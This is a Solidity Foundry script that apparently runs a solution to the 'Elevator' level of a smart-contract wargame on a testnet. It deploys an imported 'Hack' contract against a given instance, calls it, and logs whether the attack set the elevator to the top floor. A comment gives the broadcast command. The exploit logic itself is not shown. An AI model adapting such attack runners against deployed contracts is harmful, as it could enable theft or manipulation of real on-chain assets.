// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Script, console} from "forge-std/Script.sol";
import {Hack, Elevator} from "../src/level11.sol";

contract Level11Script is Script {
    function run(address instanceAddress) external {
        Elevator target = Elevator(instanceAddress);
        console.log("Top status before: ", target.top());

        vm.startBroadcast();
        Hack hackContract = new Hack(instanceAddress);
        hackContract.hack();
        vm.stopBroadcast();

        bool isTop = target.top();
        console.log("Top status after: ", isTop);
        console.log("Attack successful: ", isTop == true);
    }
}
//forge script script/level11.s.sol:Level11Script --rpc-url $SEPOLIA_RPC_URL --broadcast --account yourkey --sig "run(address)" 0xEfBB0544d900b0eFF66ef6932C977cC27704721B
